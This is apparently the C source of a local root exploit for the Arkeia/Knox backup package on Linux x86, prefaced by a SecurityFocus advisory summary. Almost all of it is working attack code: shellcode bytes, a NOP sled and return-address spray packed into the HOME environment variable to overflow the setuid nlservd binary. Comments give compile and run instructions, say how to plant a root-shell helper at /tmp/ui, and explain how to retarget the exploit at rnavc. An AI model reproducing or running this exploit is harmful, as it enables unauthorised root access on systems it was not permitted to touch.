/*
source: http://www.securityfocus.com/bid/661/info

Knox Software Arkeia 4.0 Backup rnavc & nlserverd HOME Environment Variable Buffer Overflow

A local buffer overflow in the handling of the HOME environment variable by the rlserver and rnavc binaries that are part of the Knox Software Arkiea backup application allow local users to obtain root access.
*/


/*
 * nlservd/rnavc local root exploit for Linux x86 tested on SuSE 6.2
 * exploits Arkiea's Knox backup package.
 * gcc -o knox knox.c
 * ./knox <offset> <buflen>
 *
 *
 * NOTE: you *MUST* have void main(){setuid(geteuid());
system("/bin/bash");}
 *       compiled in /tmp/ui for this to work.
 *
 * To exploit rnavc, simply change the execl call to
("/usr/bin/knox/rnavc",
 *                                                  "rnavc", NULL)
 * -Brock Tellier btellier@webley.com
 */


#include <stdlib.h>
#include <stdio.h>

char exec[]= /* Generic Linux x86 running our /tmp program */
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/tmp/ui";



#define LEN 2000
#define NOP 0x90

unsigned long get_sp(void) {

__asm__("movl %esp, %eax");

}


void main(int argc, char *argv[]) {

int offset=0;
int i;
int buflen = LEN;
long int addr;
char buf[LEN];

 if(argc > 3) {
  fprintf(stderr, "Error: Usage: %s offset buffer\n", argv[0]);
 exit(0);
 }
 else if (argc == 2){
   offset=atoi(argv[1]);

 }
 else if (argc == 3) {
   offset=atoi(argv[1]);
   buflen=atoi(argv[2]);

 }
 else {
   offset=2800;
   buflen=1200;

 }


addr=get_sp();

fprintf(stderr, "Arkiea Knox backup package exploit\n");
fprintf(stderr, "For nlservd and rnavc\n");
fprintf(stderr, "Brock Tellier btellier@webley.com\n");
fprintf(stderr, "Using addr: 0x%x\n", addr+offset);

memset(buf,NOP,buflen);
memcpy(buf+(buflen/2),exec,strlen(exec));
for(i=((buflen/2) + strlen(exec))+3;i<buflen-4;i+=4)
 *(int *)&buf[i]=addr+offset;

setenv("HOME", buf, 1);
execl("/usr/knox/bin/nlservd", "nlservd", NULL);


}

